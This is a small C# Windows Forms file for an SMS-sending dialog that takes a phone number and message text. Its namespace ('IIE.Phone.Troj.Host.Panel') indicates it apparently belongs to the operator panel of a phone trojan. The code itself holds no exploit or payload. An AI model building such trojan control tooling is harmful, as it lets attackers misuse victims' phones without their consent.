using System;
using System.Windows.Forms;

namespace IIE.Phone.Troj.Host.Panel
{
    public partial class SendSmsFrm : Form
    {
        public string PhoneNumber
        {
            get
            {
                return tbNumber.Text.Trim();
            }
        }

        public string SmsContent
        {
            get { return tbContent.Text.Trim(); }
        }

        public SendSmsFrm()
        {
            InitializeComponent();
            DialogResult = DialogResult.Cancel;
        }

        private void btnOk_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(PhoneNumber) && !string.IsNullOrEmpty(SmsContent))
            {
                DialogResult = DialogResult.OK;
                Close();
            }
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}
